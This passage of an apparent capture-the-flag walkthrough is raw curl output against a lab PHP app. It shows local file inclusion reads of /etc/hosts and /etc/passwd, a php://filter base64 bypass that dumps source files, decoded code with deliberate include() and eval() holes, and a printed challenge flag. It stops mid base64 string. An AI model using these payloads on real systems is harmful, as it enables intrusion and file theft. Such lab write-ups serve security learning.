}
</style>
</head>
<body>

<div class="container">

<header>
   <h1>My great web-app!</h1>
</header>
  
<nav>
  <ul>
    <li><a href="?p=welcome">Welcome</a></li>
    <li><a href="?p=flag">Flag</a></li>
    <li><a href="?p=party">Let's Party!</a></li>
    <li><a href="?p=reader">Feed Reader</a></li>
  </ul>
</nav>

<article>
<h1>Flag</h1>
<p>Hmm. Looking for a flag? Come on... I haven't made it easy yet, did you think I was going to this time?</p>
<img src="trollface.png" />

</article>

<footer>Hack the Planet!</footer>

</div>

</body>
</html>

root@kali:/media/bobdisk# curl http://192.168.100.101/c2444910794e037ebd8aaf257178c90b/?p=data
<!DOCTYPE html>
<html>
<head>
<title>I think you're on the right track now!</title>
<style>
div.container {
    width: 100%;
    border: 1px solid gray;
}

header, footer {
    padding: 1em;
    color: white;
    background-color: black;
    clear: left;
    text-align: center;
}

nav {
    float: left;
    max-width: 160px;
    margin: 0;
    padding: 1em;
}

nav ul {
    list-style-type: none;
    padding: 0;
}
   
nav ul a {
    text-decoration: none;
}

article {
    margin-left: 170px;
    border-left: 1px solid gray;
    padding: 1em;
    overflow: hidden;
}
</style>
</head>
<body>

<div class="container">

<header>
   <h1>My great web-app!</h1>
</header>
  
<nav>
  <ul>
    <li><a href="?p=welcome">Welcome</a></li>
    <li><a href="?p=flag">Flag</a></li>
    <li><a href="?p=party">Let's Party!</a></li>
    <li><a href="?p=reader">Feed Reader</a></li>
  </ul>
</nav>

<article>

</article>

<footer>Hack the Planet!</footer>

</div>

</body>
</html>

root@kali:/media/bobdisk# curl http://192.168.100.101/c2444910794e037ebd8aaf257178c90b/?p=data.txt
<!DOCTYPE html>
<html>
<head>
<title>I think you're on the right track now!</title>
<style>
div.container {
    width: 100%;
    border: 1px solid gray;
}

header, footer {
    padding: 1em;
    color: white;
    background-color: black;
    clear: left;
    text-align: center;
}

nav {
    float: left;
    max-width: 160px;
    margin: 0;
    padding: 1em;
}

nav ul {
    list-style-type: none;
    padding: 0;
}
   
nav ul a {
    text-decoration: none;
}

article {
    margin-left: 170px;
    border-left: 1px solid gray;
    padding: 1em;
    overflow: hidden;
}
</style>
</head>
<body>

<div class="container">

<header>
   <h1>My great web-app!</h1>
</header>
  
<nav>
  <ul>
    <li><a href="?p=welcome">Welcome</a></li>
    <li><a href="?p=flag">Flag</a></li>
    <li><a href="?p=party">Let's Party!</a></li>
    <li><a href="?p=reader">Feed Reader</a></li>
  </ul>
</nav>

<article>
##text##
This is some example source data for my nice little feed reader. I have designed my own nice little format which will allow it to include dynamic content. Who needs consultants when it's this easy? :) 

One of the best things is this will allow me to host my feed content to display on this page on an external server! So flexible :D
##text##

##php##
print("See? This is totally dynamic, generated by PHP right in my own little tool. Hacker proof, too, because there is a secret key required!");
##php##

</article>

<footer>Hack the Planet!</footer>

</div>

</body>
</html>

root@kali:/media/bobdisk# curl http://192.168.100.101/c2444910794e037ebd8aaf257178c90b/?p=data.txt
```

Enum of potential LFI

```bash
root@kali:/media/bobdisk# curl http://192.168.100.101/c2444910794e037ebd8aaf257178c90b/?p=/etc/hosts
<!DOCTYPE html>
<html>
<head>
<title>I think you're on the right track now!</title>
<style>
div.container {
    width: 100%;
    border: 1px solid gray;
}

header, footer {
    padding: 1em;
    color: white;
    background-color: black;
    clear: left;
    text-align: center;
}

nav {
    float: left;
    max-width: 160px;
    margin: 0;
    padding: 1em;
}

nav ul {
    list-style-type: none;
    padding: 0;
}
   
nav ul a {
    text-decoration: none;
}

article {
    margin-left: 170px;
    border-left: 1px solid gray;
    padding: 1em;
    overflow: hidden;
}
</style>
</head>
<body>

<div class="container">

<header>
   <h1>My great web-app!</h1>
</header>
  
<nav>
  <ul>
    <li><a href="?p=welcome">Welcome</a></li>
    <li><a href="?p=flag">Flag</a></li>
    <li><a href="?p=party">Let's Party!</a></li>
    <li><a href="?p=reader">Feed Reader</a></li>
  </ul>
</nav>

<article>
127.0.0.1	localhost
127.0.1.1	skuzzy

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

</article>

<footer>Hack the Planet!</footer>

</div>

</body>
</html>

root@kali:/media/bobdisk# 
root@kali:/media/bobdisk# curl http://192.168.100.101/c2444910794e037ebd8aaf257178c90b/?p=/etc/passwd
<!DOCTYPE html>
<html>
<head>
<title>I think you're on the right track now!</title>
<style>
div.container {
    width: 100%;
    border: 1px solid gray;
}

header, footer {
    padding: 1em;
    color: white;
    background-color: black;
    clear: left;
    text-align: center;
}

nav {
    float: left;
    max-width: 160px;
    margin: 0;
    padding: 1em;
}

nav ul {
    list-style-type: none;
    padding: 0;
}
   
nav ul a {
    text-decoration: none;
}

article {
    margin-left: 170px;
    border-left: 1px solid gray;
    padding: 1em;
    overflow: hidden;
}
</style>
</head>
<body>

<div class="container">

<header>
   <h1>My great web-app!</h1>
</header>
  
<nav>
  <ul>
    <li><a href="?p=welcome">Welcome</a></li>
    <li><a href="?p=flag">Flag</a></li>
    <li><a href="?p=party">Let's Party!</a></li>
    <li><a href="?p=reader">Feed Reader</a></li>
  </ul>
</nav>

<article>
Now now.. We paid mega bucks to a big consultancy to mitigate skiddy tricks like that one! :trollface:<br /><br /><br /><br /><br /><br /><br /><br />
</article>

<footer>Hack the Planet!</footer>

</div>

</body>
</html>

root@kali:/media/bobdisk# 
```

Bypassing the p parameter check (https://aadityapurani.com/2015/09/18/read-php-files-using-lfi-base-64-bypass/)

```bash
root@kali:/media/bobdisk# curl http://192.168.100.101/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=index.php
<!DOCTYPE html>
<html>
<head>
<title>I think you're on the right track now!</title>
<style>
div.container {
    width: 100%;
    border: 1px solid gray;
}

header, footer {
    padding: 1em;
    color: white;
    background-color: black;
    clear: left;
    text-align: center;
}

nav {
    float: left;
    max-width: 160px;
    margin: 0;
    padding: 1em;
}

nav ul {
    list-style-type: none;
    padding: 0;
}
   
nav ul a {
    text-decoration: none;
}

article {
    margin-left: 170px;
    border-left: 1px solid gray;
    padding: 1em;
    overflow: hidden;
}
</style>
</head>
<body>

<div class="container">

<header>
   <h1>My great web-app!</h1>
</header>
  
<nav>
  <ul>
    <li><a href="?p=welcome">Welcome</a></li>
    <li><a href="?p=flag">Flag</a></li>
    <li><a href="?p=party">Let's Party!</a></li>
    <li><a href="?p=reader">Feed Reader</a></li>
  </ul>
</nav>

<article>
PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkkgdGhpbmsgeW91J3JlIG9uIHRoZSByaWdodCB0cmFjayBub3chPC90aXRsZT4KPHN0eWxlPgpkaXYuY29udGFpbmVyIHsKICAgIHdpZHRoOiAxMDAlOwogICAgYm9yZGVyOiAxcHggc29saWQgZ3JheTsKfQoKaGVhZGVyLCBmb290ZXIgewogICAgcGFkZGluZzogMWVtOwogICAgY29sb3I6IHdoaXRlOwogICAgYmFja2dyb3VuZC1jb2xvcjogYmxhY2s7CiAgICBjbGVhcjogbGVmdDsKICAgIHRleHQtYWxpZ246IGNlbnRlcjsKfQoKbmF2IHsKICAgIGZsb2F0OiBsZWZ0OwogICAgbWF4LXdpZHRoOiAxNjBweDsKICAgIG1hcmdpbjogMDsKICAgIHBhZGRpbmc6IDFlbTsKfQoKbmF2IHVsIHsKICAgIGxpc3Qtc3R5bGUtdHlwZTogbm9uZTsKICAgIHBhZGRpbmc6IDA7Cn0KICAgCm5hdiB1bCBhIHsKICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsKfQoKYXJ0aWNsZSB7CiAgICBtYXJnaW4tbGVmdDogMTcwcHg7CiAgICBib3JkZXItbGVmdDogMXB4IHNvbGlkIGdyYXk7CiAgICBwYWRkaW5nOiAxZW07CiAgICBvdmVyZmxvdzogaGlkZGVuOwp9Cjwvc3R5bGU+CjwvaGVhZD4KPGJvZHk+Cgo8ZGl2IGNsYXNzPSJjb250YWluZXIiPgoKPGhlYWRlcj4KICAgPGgxPk15IGdyZWF0IHdlYi1hcHAhPC9oMT4KPC9oZWFkZXI+CiAgCjxuYXY+CiAgPHVsPgogICAgPGxpPjxhIGhyZWY9Ij9wPXdlbGNvbWUiPldlbGNvbWU8L2E+PC9saT4KICAgIDxsaT48YSBocmVmPSI/cD1mbGFnIj5GbGFnPC9hPjwvbGk+CiAgICA8bGk+PGEgaHJlZj0iP3A9cGFydHkiPkxldCdzIFBhcnR5ITwvYT48L2xpPgogICAgPGxpPjxhIGhyZWY9Ij9wPXJlYWRlciI+RmVlZCBSZWFkZXI8L2E+PC9saT4KICA8L3VsPgo8L25hdj4KCjxhcnRpY2xlPgo8P3BocApkZWZpbmUoJ1ZJQUlOREVYJywgdHJ1ZSk7CgovLyBQYXJhbWV0ZXIgaXMgJF9HRVRbJ3AnXSBmb3IgdGhlIHBhZ2UuCi8vIFVzZSBvZiBudWxsYnl0ZXMgYXBwZWFyIHRvIGJlIG1pdGlnYXRlZCBpbiBpbmNsdWRlKCkgaW4gUEhQNy4gVGhpcyBpcyBhIGdvb2QgCi8vIHRoaW5nLgovLyBCdXQsIGZvcnR1bmF0ZWx5IGZvciB0aGlzIENURiBjaGFsbGVuZ2UsIGEgZGlyZWN0IGluY2x1ZGUgc3RpbGwgd29ya3MsIHNvLi4gd2UnbGwKLy8gaGF2ZSB0byBoYWNrIGFyb3VuZCB0aGlzLgoKJHBhZ2UgPSAkX0dFVFsncCddOwppZihpc19hcnJheSgkcGFnZSkpIHsKICAgZGllKCJZZWFoPyBOYWguLiIpOwp9CgovLyBDaGVjayB0aGUgbG9jYWwgZGlyIHdpdGggLnBocCBhcHBlbmRlZAppZihmaWxlX2V4aXN0cygkcGFnZSAuICcucGhwJykpIHsKICAgICRwYWdlID0gJHBhZ2UgLiAnLnBocCc7Cn0KCmlmKHN0cnN0cigkcGFnZSwgJ3Bhc3N3ZCcpKSB7CiAgICBwcmludCAiTm93IG5vdy4uIFdlIHBhaWQgbWVnYSBidWNrcyB0byBhIGJpZyBjb25zdWx0YW5jeSB0byBtaXRpZ2F0ZSBza2lkZHkgdHJpY2tzIGxpa2UgdGhhdCBvbmUhIDp0cm9sbGZhY2U6IjsKICAgIHByaW50ICI8YnIgLz48YnIgLz48YnIgLz48YnIgLz4iOwogICAgcHJpbnQgIjxiciAvPjxiciAvPjxiciAvPjxiciAvPiI7Cn0gZWxzZWlmKHN0cnN0cigkcGFnZSwgImFjY2Vzcy5sb2ciKSB8fCBzdHJzdHIoJHBhZ2UsICJuZ2lueC5sb2ciKSkgewogICAgcHJpbnQgKCJOdXAsIHdlJ3ZlIGJsb2NrZWQgdGhhdCBvbmUsIGJ1dCBpdCdzIG1pdGlnYXRlZCBpbiBOZ2lueCBub3cgYW55d2F5Iik7Cn0gZWxzZSB7CiAgICBpbmNsdWRlKCRwYWdlKTsKfQoKPz4KCjwvYXJ0aWNsZT4KCjxmb290ZXI+SGFjayB0aGUgUGxhbmV0ITwvZm9vdGVyPgoKPC9kaXY+Cgo8L2JvZHk+CjwvaHRtbD4KCg==
</article>

<footer>Hack the Planet!</footer>

</div>

</body>
</html>

root@kali:/media/bobdisk# echo "PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkkgdGhpbmsgeW91J3JlIG9uIHRoZSByaWdodCB0cmFjayBub3chPC90aXRsZT4KPHN0eWxlPgpkaXYuY29udGFpbmVyIHsKICAgIHdpZHRoOiAxMDAlOwogICAgYm9yZGVyOiAxcHggc29saWQgZ3JheTsKfQoKaGVhZGVyLCBmb290ZXIgewogICAgcGFkZGluZzogMWVtOwogICAgY29sb3I6IHdoaXRlOwogICAgYmFja2dyb3VuZC1jb2xvcjogYmxhY2s7CiAgICBjbGVhcjogbGVmdDsKICAgIHRleHQtYWxpZ246IGNlbnRlcjsKfQoKbmF2IHsKICAgIGZsb2F0OiBsZWZ0OwogICAgbWF4LXdpZHRoOiAxNjBweDsKICAgIG1hcmdpbjogMDsKICAgIHBhZGRpbmc6IDFlbTsKfQoKbmF2IHVsIHsKICAgIGxpc3Qtc3R5bGUtdHlwZTogbm9uZTsKICAgIHBhZGRpbmc6IDA7Cn0KICAgCm5hdiB1bCBhIHsKICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsKfQoKYXJ0aWNsZSB7CiAgICBtYXJnaW4tbGVmdDogMTcwcHg7CiAgICBib3JkZXItbGVmdDogMXB4IHNvbGlkIGdyYXk7CiAgICBwYWRkaW5nOiAxZW07CiAgICBvdmVyZmxvdzogaGlkZGVuOwp9Cjwvc3R5bGU+CjwvaGVhZD4KPGJvZHk+Cgo8ZGl2IGNsYXNzPSJjb250YWluZXIiPgoKPGhlYWRlcj4KICAgPGgxPk15IGdyZWF0IHdlYi1hcHAhPC9oMT4KPC9oZWFkZXI+CiAgCjxuYXY+CiAgPHVsPgogICAgPGxpPjxhIGhyZWY9Ij9wPXdlbGNvbWUiPldlbGNvbWU8L2E+PC9saT4KICAgIDxsaT48YSBocmVmPSI/cD1mbGFnIj5GbGFnPC9hPjwvbGk+CiAgICA8bGk+PGEgaHJlZj0iP3A9cGFydHkiPkxldCdzIFBhcnR5ITwvYT48L2xpPgogICAgPGxpPjxhIGhyZWY9Ij9wPXJlYWRlciI+RmVlZCBSZWFkZXI8L2E+PC9saT4KICA8L3VsPgo8L25hdj4KCjxhcnRpY2xlPgo8P3BocApkZWZpbmUoJ1ZJQUlOREVYJywgdHJ1ZSk7CgovLyBQYXJhbWV0ZXIgaXMgJF9HRVRbJ3AnXSBmb3IgdGhlIHBhZ2UuCi8vIFVzZSBvZiBudWxsYnl0ZXMgYXBwZWFyIHRvIGJlIG1pdGlnYXRlZCBpbiBpbmNsdWRlKCkgaW4gUEhQNy4gVGhpcyBpcyBhIGdvb2QgCi8vIHRoaW5nLgovLyBCdXQsIGZvcnR1bmF0ZWx5IGZvciB0aGlzIENURiBjaGFsbGVuZ2UsIGEgZGlyZWN0IGluY2x1ZGUgc3RpbGwgd29ya3MsIHNvLi4gd2UnbGwKLy8gaGF2ZSB0byBoYWNrIGFyb3VuZCB0aGlzLgoKJHBhZ2UgPSAkX0dFVFsncCddOwppZihpc19hcnJheSgkcGFnZSkpIHsKICAgZGllKCJZZWFoPyBOYWguLiIpOwp9CgovLyBDaGVjayB0aGUgbG9jYWwgZGlyIHdpdGggLnBocCBhcHBlbmRlZAppZihmaWxlX2V4aXN0cygkcGFnZSAuICcucGhwJykpIHsKICAgICRwYWdlID0gJHBhZ2UgLiAnLnBocCc7Cn0KCmlmKHN0cnN0cigkcGFnZSwgJ3Bhc3N3ZCcpKSB7CiAgICBwcmludCAiTm93IG5vdy4uIFdlIHBhaWQgbWVnYSBidWNrcyB0byBhIGJpZyBjb25zdWx0YW5jeSB0byBtaXRpZ2F0ZSBza2lkZHkgdHJpY2tzIGxpa2UgdGhhdCBvbmUhIDp0cm9sbGZhY2U6IjsKICAgIHByaW50ICI8YnIgLz48YnIgLz48YnIgLz48YnIgLz4iOwogICAgcHJpbnQgIjxiciAvPjxiciAvPjxiciAvPjxiciAvPiI7Cn0gZWxzZWlmKHN0cnN0cigkcGFnZSwgImFjY2Vzcy5sb2ciKSB8fCBzdHJzdHIoJHBhZ2UsICJuZ2lueC5sb2ciKSkgewogICAgcHJpbnQgKCJOdXAsIHdlJ3ZlIGJsb2NrZWQgdGhhdCBvbmUsIGJ1dCBpdCdzIG1pdGlnYXRlZCBpbiBOZ2lueCBub3cgYW55d2F5Iik7Cn0gZWxzZSB7CiAgICBpbmNsdWRlKCRwYWdlKTsKfQoKPz4KCjwvYXJ0aWNsZT4KCjxmb290ZXI+SGFjayB0aGUgUGxhbmV0ITwvZm9vdGVyPgoKPC9kaXY+Cgo8L2JvZHk+CjwvaHRtbD4KCg==" | base64 -d
<!DOCTYPE html>
<html>
<head>
<title>I think you're on the right track now!</title>
<style>
div.container {
    width: 100%;
    border: 1px solid gray;
}

header, footer {
    padding: 1em;
    color: white;
    background-color: black;
    clear: left;
    text-align: center;
}

nav {
    float: left;
    max-width: 160px;
    margin: 0;
    padding: 1em;
}

nav ul {
    list-style-type: none;
    padding: 0;
}
   
nav ul a {
    text-decoration: none;
}

article {
    margin-left: 170px;
    border-left: 1px solid gray;
    padding: 1em;
    overflow: hidden;
}
</style>
</head>
<body>

<div class="container">

<header>
   <h1>My great web-app!</h1>
</header>
  
<nav>
  <ul>
    <li><a href="?p=welcome">Welcome</a></li>
    <li><a href="?p=flag">Flag</a></li>
    <li><a href="?p=party">Let's Party!</a></li>
    <li><a href="?p=reader">Feed Reader</a></li>
  </ul>
</nav>

<article>
<?php
define('VIAINDEX', true);

// Parameter is $_GET['p'] for the page.
// Use of nullbytes appear to be mitigated in include() in PHP7. This is a good 
// thing.
// But, fortunately for this CTF challenge, a direct include still works, so.. we'll
// have to hack around this.

$page = $_GET['p'];
if(is_array($page)) {
   die("Yeah? Nah..");
}

// Check the local dir with .php appended
if(file_exists($page . '.php')) {
    $page = $page . '.php';
}

if(strstr($page, 'passwd')) {
    print "Now now.. We paid mega bucks to a big consultancy to mitigate skiddy tricks like that one! :trollface:";
    print "<br /><br /><br /><br />";
    print "<br /><br /><br /><br />";
} elseif(strstr($page, "access.log") || strstr($page, "nginx.log")) {
    print ("Nup, we've blocked that one, but it's mitigated in Nginx now anyway");
} else {
    include($page);
}

?>

</article>

<footer>Hack the Planet!</footer>

</div>

</body>
</html>

root@kali:/media/bobdisk#
root@kali:/media/bobdisk# curl http://192.168.100.101/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=flag.php<!DOCTYPE html>
<html>
<head>
<title>I think you're on the right track now!</title>
<style>
div.container {
    width: 100%;
    border: 1px solid gray;
}

header, footer {
    padding: 1em;
    color: white;
    background-color: black;
    clear: left;
    text-align: center;
}

nav {
    float: left;
    max-width: 160px;
    margin: 0;
    padding: 1em;
}

nav ul {
    list-style-type: none;
    padding: 0;
}
   
nav ul a {
    text-decoration: none;
}

article {
    margin-left: 170px;
    border-left: 1px solid gray;
    padding: 1em;
    overflow: hidden;
}
</style>
</head>
<body>

<div class="container">

<header>
   <h1>My great web-app!</h1>
</header>
  
<nav>
  <ul>
    <li><a href="?p=welcome">Welcome</a></li>
    <li><a href="?p=flag">Flag</a></li>
    <li><a href="?p=party">Let's Party!</a></li>
    <li><a href="?p=reader">Feed Reader</a></li>
  </ul>
</nav>

<article>
PD9waHAKZGVmaW5lZCAoJ1ZJQUlOREVYJykgb3IgZGllKCdPb29vaCEgU28gY2xvc2UuLicpOwo/Pgo8aDE+RmxhZzwvaDE+CjxwPkhtbS4gTG9va2luZyBmb3IgYSBmbGFnPyBDb21lIG9uLi4uIEkgaGF2ZW4ndCBtYWRlIGl0IGVhc3kgeWV0LCBkaWQgeW91IHRoaW5rIEkgd2FzIGdvaW5nIHRvIHRoaXMgdGltZT88L3A+CjxpbWcgc3JjPSJ0cm9sbGZhY2UucG5nIiAvPgo8P3BocAovLyBPaywgb2suIEhlcmUncyB5b3VyIGZsYWchIAovLwovLyBmbGFnNHs0ZTQ0ZGIwZjFlZGMzYzM2MWRiZjU0ZWFmNGRmNDAzNTJkYjkxZjhifQovLyAKLy8gV2VsbCBkb25lLCB5b3UncmUgZG9pbmcgZ3JlYXQgc28gZmFyIQovLyBOZXh0IHN0ZXAuIFNIRUxMIQovLwovLyAKLy8gT2guIFRoYXQgZmxhZyBhYm92ZT8gWW91J3JlIGdvbm5hIG5lZWQgaXQuLi4gCj8+Cg==
</article>

<footer>Hack the Planet!</footer>

</div>

</body>
</html>

root@kali:/media/bobdisk# echo "PD9waHAKZGVmaW5lZCAoJ1ZJQUlOREVYJykgb3IgZGllKCdPb29vaCEgU28gY2xvc2UuLicpOwo/Pgo8aDE+RmxhZzwvaDE+CjxwPkhtbS4gTG9va2luZyBmb3IgYSBmbGFnPyBDb21lIG9uLi4uIEkgaGF2ZW4ndCBtYWRlIGl0IGVhc3kgeWV0LCBkaWQgeW91IHRoaW5rIEkgd2FzIGdvaW5nIHRvIHRoaXMgdGltZT88L3A+CjxpbWcgc3JjPSJ0cm9sbGZhY2UucG5nIiAvPgo8P3BocAovLyBPaywgb2suIEhlcmUncyB5b3VyIGZsYWchIAovLwovLyBmbGFnNHs0ZTQ0ZGIwZjFlZGMzYzM2MWRiZjU0ZWFmNGRmNDAzNTJkYjkxZjhifQovLyAKLy8gV2VsbCBkb25lLCB5b3UncmUgZG9pbmcgZ3JlYXQgc28gZmFyIQovLyBOZXh0IHN0ZXAuIFNIRUxMIQovLwovLyAKLy8gT2guIFRoYXQgZmxhZyBhYm92ZT8gWW91J3JlIGdvbm5hIG5lZWQgaXQuLi4gCj8+Cg==" | base64 -d
<?php
defined ('VIAINDEX') or die('Ooooh! So close..');
?>
<h1>Flag</h1>
<p>Hmm. Looking for a flag? Come on... I haven't made it easy yet, did you think I was going to this time?</p>
<img src="trollface.png" />
<?php
// Ok, ok. Here's your flag! 
//
// flag4{4e44db0f1edc3c361dbf54eaf4df40352db91f8b}
// 
// Well done, you're doing great so far!
// Next step. SHELL!
//
// 
// Oh. That flag above? You're gonna need it... 
?>
root@kali:/media/bobdisk# curl http://192.168.100.101/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=reader.php<!DOCTYPE html>
<html>
<head>
<title>I think you're on the right track now!</title>
<style>
div.container {
    width: 100%;
    border: 1px solid gray;
}

header, footer {
    padding: 1em;
    color: white;
    background-color: black;
    clear: left;
    text-align: center;
}

nav {
    float: left;
    max-width: 160px;
    margin: 0;
    padding: 1em;
}

nav ul {
    list-style-type: none;
    padding: 0;
}
   
nav ul a {
    text-decoration: none;
}

article {
    margin-left: 170px;
    border-left: 1px solid gray;
    padding: 1em;
    overflow: hidden;
}
</style>
</head>
<body>

<div class="container">

<header>
   <h1>My great web-app!</h1>
</header>
  
<nav>
  <ul>
    <li><a href="?p=welcome">Welcome</a></li>
    <li><a href="?p=flag">Flag</a></li>
    <li><a href="?p=party">Let's Party!</a></li>
    <li><a href="?p=reader">Feed Reader</a></li>
  </ul>
</nav>

<article>
PD9waHAKZGVmaW5lZCAoJ1ZJQUlOREVYJykgb3IgZGllKCdPb29vaCEgU28gY2xvc2UuLicpOwo/Pgo8aDE+RmVlZCBSZWFkZXI8L2gxPgo8P3BocAppZihpc3NldCgkX0dFVFsndXJsJ10pKSB7CiAgICAkdXJsID0gJF9HRVRbJ3VybCddOwp9IGVsc2UgewogICAgcHJpbnQoIjxhIGhyZWY9XCI/cD1yZWFkZXImdXJsPWh0dHA6Ly8xMjcuMC4wLjEvYzI0NDQ5MTA3OTRlMDM3ZWJkOGFhZjI1NzE3OGM5MGIvZGF0YS50eHRcIj5Mb2FkIEZlZWQ8L2E+Iik7Cn0KCmlmKGlzc2V0KCR1cmwpICYmIHN0cmxlbigkdXJsKSAhPSAnJykgewoKICAgIC8vIFNldHVwIHNvbWUgdmFyaWFibGVzLgogICAgJHNlY3JldG9rID0gZmFsc2U7CiAgICAka2V5bmVlZGVkID0gdHJ1ZTsKCiAgICAvLyBMb2NhbGhvc3QgYXMgYSBzb3VyY2UgZG9lc24ndCBuZWVkIHRvIHVzZSB0aGUga2V5LgogICAgaWYocHJlZ19tYXRjaCgiI15odHRwOi8vMTI3LjAuMC4xIyIsICR1cmwpKSB7CiAgICAgICAgJGtleW5lZWRlZCA9IGZhbHNlOwogICAgICAgICRzZWNyZXRvayA9IHRydWU7CiAgICB9CgogICAgLy8gSGFuZGxlIHRoZSBrZXkgdmFsaWRhdGlvbiB3aGVuIGl0J3MgbmVlZGVkLgogICAgaWYoJGtleW5lZWRlZCkgewogICAgICAgICRrZXkgPSAkX0dFVFsna2V5J107CiAgICAgICAgaWYoaXNfYXJyYXkoJGtleSkpIHsKICAgICAgICAgICAgZGllKCJBcnJheSB0cmljayBpcyBtaXRpZ2F0ZWQgOykiKTsKICAgICAgICB9CiAgICAgICAgaWYoaXNzZXQoJGtleSkgJiYgc3RybGVuKCRrZXkpID09ICc0NycpIHsKCSAgICAkaGFzaGVka2V5ID0gaGFzaCgnc2hhMjU2JywgJGtleSk7CiAgICAgICAgICAgICRzZWNyZXQgPSAiNWNjZDBkYmRlZWZiZWUwNzhiODhhNmU1MmRiOGMxY2FhOGRkODMxNWYyMjdmZTFlNmFlZTZiY2I2ZGI2MzY1NiI7CgogICAgICAgICAgICAvLyBJZiB5b3UgY2FuIHVzZSB0aGUgZm9sbG93aW5nIGNvZGUgZm9yIGEgdGltaW5nIGF0dGFjawogICAgICAgICAgICAvLyB0aGVuIGdvb2QgbHVjayA6KSBCdXQuLiBZb3UgaGF2ZSB0aGUgc291cmNlIGFueXdheSwgcmlnaHQ/IDopIAoJICAgIGlmKHN0cmNtcCgkaGFzaGVka2V5LCAkc2VjcmV0KSA9PSAwKSB7CiAgICAgICAgICAgICAgICAkc2VjcmV0b2sgPSB0cnVlOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgZGllKCJTb3JyeS4uLiBBdXRoZW50aWNhdGlvbiBmYWlsZWQuIEtleSB3YXMgaW52YWxpZC4iKTsKCSAgICB9CgogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGRpZSgiQXV0aGVudGljYXRpb24gaW52YWxpZC4gWW91IG1pZ2h0IG5lZWQgYSBrZXkuIik7CiAgICAgICAgfQogICAgfQoKICAgIC8vIEp1c3QgdG8gbWFrZSBzdXJlIHRoZSBhYm92ZSBrZXkgY2hlY2sgd2FzIHBhc3NlZC4KICAgIGlmKCEkc2VjcmV0b2spIHsKICAgICAgICBkaWUoIlNvbWV0aGluZyB3ZW50IHdyb25nIHdpdGggdGhlIGF1dGhlbnRpY2F0aW9uIHByb2Nlc3MiKTsKICAgIH0KCiAgICAvLyBOb3cgbG9hZCB0aGUgY29udGVudHMgb2YgdGhlIGZpbGUgd2UgYXJlIHJlYWRpbmcsIGFuZCBwYXJzZQogICAgLy8gdGhlIHN1cGVyIGF3ZXNvbWVuZXNzIG9mIGl0cyBjb250ZW50cyEKICAgICRmID0gZmlsZV9nZXRfY29udGVudHMoJHVybCk7CgogICAgJHRleHQgPSBwcmVnX3NwbGl0KCIvIyN0ZXh0IyMvcyIsICRmKTsKCiAgICBpZihpc3NldCgkdGV4dFsnMSddKSAmJiBzdHJsZW4oJHRleHRbJzEnXSkgPiAwKSB7CiAgICAgICAgcHJpbnQoJHRleHRbJzEnXSk7CiAgICB9CgogICAgcHJpbnQgIjxiciAvPjxiciAvPiI7CgogICAgJHBocCA9IHByZWdfc3BsaXQoIi8jI3BocCMjL3MiLCAkZik7CgogICAgaWYoaXNzZXQoJHBocFsnMSddKSAmJiBzdHJsZW4oJHBocFsnMSddKSA+IDApIHsgCiAgICAgICAgZXZhbCgkcGhwWycxJ10pOwogICAgICAgIC8vICJJZiBFdmFsIGlzIHRoZSBhbnN3ZXIsIHlvdSdyZSBhc2tpbmcgdGhlIHdyb25nIHF1ZXN0aW9uISIgLSBTRwogICAgICAgIC8vIEl0IGh1cnRzIG1lIHRvIHdyaXRlIGluc2VjdXJlIGNvZGUgbGlrZSB0aGlzLCBidXQgaXQgaXMgaW4gdGhlCiAgICAgICAgLy8gbmFtZSBvZiBlZHVjYXRpb24sIGFuZCBGVU4sIHNvIEknbGwgbGV0IGl0IHNsaWRlIHRoaXMgdGltZS4KICAgIH0KfQoK
</article>

<footer>Hack the Planet!</footer>

</div>

</body>
</html>

root@kali:/media/bobdisk# echo "PD9waHAKZGVmaW5lZCAoJ1ZJQUlOREVYJykgb3IgZGllKCdPb29vaCEgU28gY2xvc2UuLicpOwo/Pgo8aDE+RmVlZCBSZWFkZXI8L2gxPgo8P3BocAppZihpc3NldCgkX0dFVFsndXJsJ10pKSB7CiAgICAkdXJsID0gJF9HRVRbJ3VybCddOwp9IGVsc2UgewogICAgcHJpbnQoIjxhIGhyZWY9XCI/cD1yZWFkZXImdXJsPWh0dHA6Ly8xMjcuMC4wLjEvYzI0NDQ5MTA3OTRlMDM3ZWJkOGFhZjI1NzE3OGM5MGIvZGF0YS50eHRcIj5Mb2FkIEZlZWQ8L2E+Iik7Cn0KCmlmKGlzc2V0KCR1cmwpICYmIHN0cmxlbigkdXJsKSAhPSAnJykgewoKICAgIC8vIFNldHVwIHNvbWUgdmFyaWFibGVzLgogICAgJHNlY3JldG9rID0gZmFsc2U7CiAgICAka2V5bmVlZGVkID0gdHJ1ZTsKCiAgICAvLyBMb2NhbGhvc3QgYXMgYSBzb3VyY2UgZG9lc24ndCBuZWVkIHRvIHVzZSB0aGUga2V5LgogICAgaWYocHJlZ19tYXRjaCgiI15odHRwOi8vMTI3LjAuMC4xIyIsICR1cmwpKSB7CiAgICAgICAgJGtleW5lZWRlZCA9IGZhbHNlOwogICAgICAgICRzZWNyZXRvayA9IHRydWU7CiAgICB9CgogICAgLy8gSGFuZGxlIHRoZSBrZXkgdmFsaWRhdGlvbiB3aGVuIGl0J3MgbmVlZGVkLgogICAgaWYoJGtleW5lZWRlZCkgewogICAgICAgICRrZXkgPSAkX0dFVFsna2V5J107CiAgICAgICAgaWYoaXNfYXJyYXkoJGtleSkpIHsKICAgICAgICAgICAgZGllKCJBcnJheSB0cmljayBpcyBtaXRpZ2F0ZWQgOykiKTsKICAgICAgICB9CiAgICAgICAgaWYoaXNzZXQoJGtleSkgJiYgc3RybGVuKCRrZXkpID09ICc0NycpIHsKCSAgICAkaGFzaGVka2V5ID0gaGFzaCgnc2hhMjU2JywgJGtleSk7CiAgICAgICAgICAgICRzZWNyZXQgPSAiNWNjZDBkYmRlZWZiZWUwNzhiODhhNmU1MmRiOGMxY2FhOGRkODMxNWYyMjdmZTFlNmFlZTZiY2I2ZGI2MzY1